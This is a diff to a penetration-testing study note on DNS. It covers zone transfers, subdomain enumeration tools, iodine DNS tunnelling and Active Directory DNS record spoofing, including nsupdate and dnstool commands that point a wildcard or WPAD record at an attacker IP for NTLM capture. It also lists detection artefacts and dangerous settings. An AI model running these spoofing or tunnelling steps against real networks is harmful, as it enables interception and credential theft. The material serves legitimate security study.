@@ -1,11 +1,33 @@
+# DNS
+
 #DNS #DomainNameServices #networkmanagement
 
 ## What is DNS?
-Domain Name System — phonebook of the internet. Resolves human-readable domain names to IP addresses. Hierarchical, distributed, and critical infrastructure. Misconfigured DNS can expose internal network topology.
+Domain Name System — the phonebook of the internet: resolves names to IPs, hierarchical and distributed. On an engagement it's a recon goldmine — a misconfigured server hands you the entire internal network map via **zone transfer**, subdomain brute forcing reveals hidden hosts, and in AD environments the **DNS is domain-integrated** (ADIDNS), so it's both an enumeration source and a spoofing/coercion surface.
 
-- Port **TCP/UDP 53** — DNS queries (TCP for zone transfers, UDP for standard queries)
-- 13 root servers managed by ICANN
+- Port **UDP 53** — standard queries; **TCP 53** — zone transfers and responses > 512 bytes
 - Recursive resolution: resolver → root → TLD → authoritative
+- In AD: DNS is usually **AD-integrated** on the DC (dynamic updates, records stored in the directory)
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Network/dig\|dig]] | The primary query tool — records, `@server`, `axfr` zone transfer |
+| [[Tools/Network/nslookup\|nslookup]] | Cross-platform query (interactive `server`/`set type=`) |
+| [[Tools/Network/dnsenum\|dnsenum]] | Combined enum: records, AXFR, subdomain brute, reverse |
+| [[Tools/Network/dnsrecon\|dnsrecon]] | Standard/AXFR/brute enumeration (`-t std,axfr,brt`) |
+| [[Tools/Network/fierce\|fierce]] | Subdomain discovery + reverse-lookup sweep |
+| [[Tools/Scanning/gobuster\|gobuster]] | Fast subdomain brute (`gobuster dns`) |
+| [[Tools/Recon/amass\|amass]] | Passive + active subdomain enumeration (OSINT) |
+| [[Tools/Recon/subjack\|subjack]] | Subdomain-takeover detection |
+| [[Tools/Scanning/nuclei\|nuclei]] | Takeover templates (`-t takeovers/`) |
+| [[Tools/AD/adidnsdump\|adidnsdump]] | Dump AD-integrated DNS incl. hidden records (authenticated) |
+| [[Tools/Scanning/NMAP\|NMAP]] | `dns-brute`, `dns-recursion` NSE |
+
+Also used inline: `ldns-walk` (NSEC zone walking), `iodine` (DNS tunnelling), `dnsspoof` (cache poisoning via MITM).
 
 ---
 
@@ -47,16 +69,6 @@ Domain Name System — phonebook of the internet. Resolves human-readable domain
 | Local zones config | `/etc/bind/named.conf.local` |
 | Options config | `/etc/bind/named.conf.options` |
 | Zone files | `/etc/bind/db.<domain>` or `/var/cache/bind/` |
-
-### Dangerous Settings
-
-| Setting | Risk |
-|---|---|
-| `allow-transfer { any; }` | Zone transfer to any host |
-| `allow-recursion { any; }` | Open recursive resolver (DDoS amplification) |
-| `allow-query { any; }` | Query allowed from any IP |
-| DNSSEC not configured | DNS spoofing / cache poisoning |
-| Zone files world-readable | Internal network topology disclosed |
 
 ---
 
@@ -203,6 +215,47 @@ iodined -f 10.0.0.1 tunnel.domain.com
 iodine -f 10.129.14.128 tunnel.domain.com
 ```
 
+### AD-integrated DNS (ADIDNS) — enum + spoofing
+
+In Active Directory the DNS zone lives in the directory and **any authenticated user can create records by default** (secure dynamic update still allows creation of *new* names). This is both an enumeration source and an attack surface:
+
+```bash
+# Dump the zone incl. records hidden from anonymous queries (authenticated)
+adidnsdump -u <domain>\\<user> -p <pass> <DC_IP>
+adidnsdump -u <domain>\\<user> -p <pass> --print-zones <DC_IP>
+
+# Add/spoof a record via dynamic update (nsupdate / bloodyAD / dnstool)
+nsupdate            # then: server <DC>; update add evil.domain 3600 A <attacker>; send
+python3 dnstool.py -u '<domain>\<user>' -p <pass> -a add -r <name> -d <attacker_ip> <DC>
+```
+
+- **Wildcard / WPAD injection**: create the `*` record or a `wpad` entry (the WPAD global-query-block list only protects the literal `wpad`, not names you add) → responses funnel to you for **MITM / NTLM capture** (feed [[Tools/Lateral Movement/responder|responder]]/relay). Cross-ref [[Services/File Xfer/SMB|SMB]] relay.
+- **Subdomain takeover** (below) is the cloud analog of the same "point a name at attacker-controlled infra" idea.
+
+---
+
+## Detection & Artefacts
+
+- **Zone transfer (AXFR)** is a single large TCP/53 response to a non-secondary host — trivially logged and abnormal; the loudest recon here.
+- **Subdomain brute** = a burst of NXDOMAIN responses for guessed names from one resolver.
+- **ADIDNS record creation** shows in DNS-Server event logs and as new objects under the zone in AD (directory replication) — a new `A`/wildcard/`wpad` record from a normal user account is the IOC.
+- **DNS tunnelling** = high volume of long, high-entropy TXT/NULL/CNAME queries to one domain — the classic exfil signature.
+- Defensive baseline: restrict `allow-transfer` to secondaries, disable open recursion, enable DNSSEC, set the ADIDNS global query block list + secure-only updates, and monitor for anomalous query volume/entropy.
+
+---
+
+## Dangerous Settings
+
+| Setting | Risk |
+|---|---|
+| `allow-transfer { any; }` | Zone transfer to any host → full internal topology disclosure |
+| `allow-recursion { any; }` | Open recursive resolver → DDoS amplification / cache poisoning |
+| `allow-query { any; }` | Queries allowed from any source IP |
+| DNSSEC not configured | DNS spoofing / cache poisoning |
+| Zone files world-readable | Internal network topology disclosed on-box |
+| ADIDNS insecure/any-authenticated updates | Record spoofing, wildcard/WPAD injection → MITM/relay |
+| Dangling CNAME to a deprovisioned cloud resource | Subdomain takeover |
+
 ---
 
 ## Quick Reference
@@ -213,6 +266,18 @@ iodine -f 10.129.14.128 tunnel.domain.com
 | Zone transfer | `dig axfr @nameserver domain` |
 | All records | `dig ANY @nameserver domain` |
 | Reverse lookup | `dig -x IP` |
-| Subdomain brute | `gobuster dns -d domain -w wordlist.txt` |
+| Subdomain brute | `gobuster dns --domain domain -w wordlist.txt` |
 | Subdomain enum | `dnsenum --enum domain -f wordlist.txt` |
 | Check open recursion | `nmap -sU -p 53 --script dns-recursion host` |
+| Dump AD DNS | `adidnsdump -u dom\\user -p pass DC_IP` |
+| Spoof AD record | `nsupdate` → `update add evil.dom 3600 A <attacker>` |
+
+---
+
+> [!note] **See also** — AD-integrated DNS ties into [[Services/Active Directory/Kerberos|Active Directory]] enumeration and [[Services/File Xfer/SMB|SMB]] relay (WPAD/wildcard → [[Tools/Lateral Movement/responder|responder]]); dumped via [[Tools/AD/adidnsdump|adidnsdump]]. Network-infra siblings [[Services/Network management/LDAP|LDAP]] and [[Services/Network management/NetBIOS|NetBIOS]] (the other name-resolution/poisoning surfaces), and [[Services/Network management/NTP|NTP]] (clock-skew fix for Kerberos + time-shift MITM).
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-23*
+*Model: claude-opus-4-8*
